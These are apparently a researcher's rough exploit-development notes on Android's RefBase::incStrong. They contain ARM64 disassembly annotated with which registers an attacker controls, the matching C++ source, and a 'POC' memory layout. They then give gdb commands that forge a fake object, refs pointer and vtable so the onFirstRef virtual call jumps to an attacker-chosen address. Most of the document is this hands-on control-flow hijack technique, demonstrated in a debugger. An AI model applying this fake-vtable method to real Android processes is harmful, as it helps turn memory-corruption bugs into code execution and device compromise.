RefBase::incStrong
_ZNK7android7RefBase9incStrongEPKv:

=> 0x0000007fb7f4c1d4 <+0>:	stp	x29, x30, [sp, #-32]!
   0x0000007fb7f4c1d8 <+4>:	mov	x29, sp
   0x0000007fb7f4c1dc <+8>:	str	x19, [sp, #16]      // x19 <- the heap object an attacker controls
   0x0000007fb7f4c1e0 <+12>:	ldr	x19, [x0, #8]
   0x0000007fb7f4c1e4 <+16>:	mov	x0, x19
   0x0000007fb7f4c1e8 <+20>:	bl	0x7fb7f48a50 <_ZN7android7RefBase12weakref_type7incWeakEPKv@plt>
   0x0000007fb7f4c1ec <+24>:	ldxr	w1, [x19]
   0x0000007fb7f4c1f0 <+28>:	add	w0, w1, #0x1    // incStrong (plus 1)
   0x0000007fb7f4c1f4 <+32>:	stlxr	w2, w0, [x19]
   0x0000007fb7f4c1f8 <+36>:	cbnz	w2, 0x7fb7f4c1ec <_ZNK7android7RefBase9incStrongEPKv+24>
   0x0000007fb7f4c1fc <+40>:	mov	w3, #0x10000000            	// #268435456
   0x0000007fb7f4c200 <+44>:	cmp	w1, w3
   0x0000007fb7f4c204 <+48>:	b.eq	0x7fb7f4c214 <_ZNK7android7RefBase9incStrongEPKv+64>  // b.none
   0x0000007fb7f4c208 <+52>:	ldr	x19, [sp, #16]
   0x0000007fb7f4c20c <+56>:	ldp	x29, x30, [sp], #32
   0x0000007fb7f4c210 <+60>:	ret
   0x0000007fb7f4c214 <+64>:	mov	w4, #0xf0000000            	// #-268435456
   0x0000007fb7f4c218 <+68>:	ldxr	w5, [x19]
   0x0000007fb7f4c21c <+72>:	add	w6, w5, w4
   0x0000007fb7f4c220 <+76>:	stlxr	w7, w6, [x19]
   0x0000007fb7f4c224 <+80>:	cbnz	w7, 0x7fb7f4c218 <_ZNK7android7RefBase9incStrongEPKv+68>
   0x0000007fb7f4c228 <+84>:	ldr	x0, [x19, #8]
   0x0000007fb7f4c22c <+88>:	adrp	x10, 0x7fb7f4c000 <_ZN7android11PropertyMap6Parser5parseEv+760>
   0x0000007fb7f4c230 <+92>:	add	x11, x10, #0x130
   0x0000007fb7f4c234 <+96>:	ldr	x8, [x0]                    //vtable    (debug here!!!)
   0x0000007fb7f4c238 <+100>:	ldr	x9, [x8, #16]
   0x0000007fb7f4c23c <+104>:	cmp	x9, x11
   0x0000007fb7f4c240 <+108>:	b.eq	0x7fb7f4c208 <_ZNK7android7RefBase9incStrongEPKv+52>  // b.none
   0x0000007fb7f4c244 <+112>:	blr	x9
   0x0000007fb7f4c248 <+116>:	b	0x7fb7f4c208 <_ZNK7android7RefBase9incStrongEPKv+52>

void RefBase::incStrong(const void* id) const
{
    weakref_impl* const refs = mRefs;
    refs->incWeak(id);

    refs->addStrongRef(id);
    const int32_t c = android_atomic_inc(&refs->mStrong);
    ALOG_ASSERT(c > 0, "incStrong() called on %p after last strong ref", refs);
#if PRINT_REFS
    ALOGD("incStrong of %p from %p: cnt=%d\n", this, id, c);
#endif
    if (c != INITIAL_STRONG_VALUE)  {
        return;
    }

    android_atomic_add(-INITIAL_STRONG_VALUE, &refs->mStrong);
    refs->mBase->onFirstRef();  //haonotes
}

0x0000005581707cb8
x0: 0x7fb7b55000

0x7fb7b55000:	0x0000005594a4acb8(mutable; idk y)	0x0000007fb7b51040 (x19 / mrefs)
...
0x7fb7b51040:	0x0000000010000000	0x0000007fb7b55000


POC: *(addr)
addr:       addr+24 (vptr)
addr+8 :    addr + 16       <- mrefs
addr+16 :   0x10000000      <- x19
addr+24 :   ...(vtable)
addr+32 :
addr+40 :   addr + 48
addr+48 :   0xdeadbeef

addr+64 :   0xcafebabe      <-pc! ldr x9, [x8, #16] ; blr	x9

set *(0x7fb7b55000)=0xb7b55000+24
set *(0x7fb7b55000+4)=0x7f

set *(0x7fb7b55000+8)=0xb7b55000+16
set *(0x7fb7b55000+12)=0x7f

set *(0x7fb7b55000+16)=0x10000000

set *(0x7fb7b55000+24)=0xb7b55000+40
set *(0x7fb7b55000+28)=0x7f

set *(0x7fb7b55000+40)=0xb7b55000+48
set *(0x7fb7b55000+44)=0x7f

set *(0x7fb7b55000+48)=0x61616161
set *(0x7fb7b55000+52)=0x61616161

set *(0x7fb7b55000+64)=0x61616161
set *(0x7fb7b55000+68)=0x61616161

###Debug at 0x0000007fb7f4c234
x0:Our object

0x7fb7b55000:	0x0000005594a4acb8	0x0000007fb7b51040 (x19 / mrefs)
                |
                |
                |
                |--------->>>



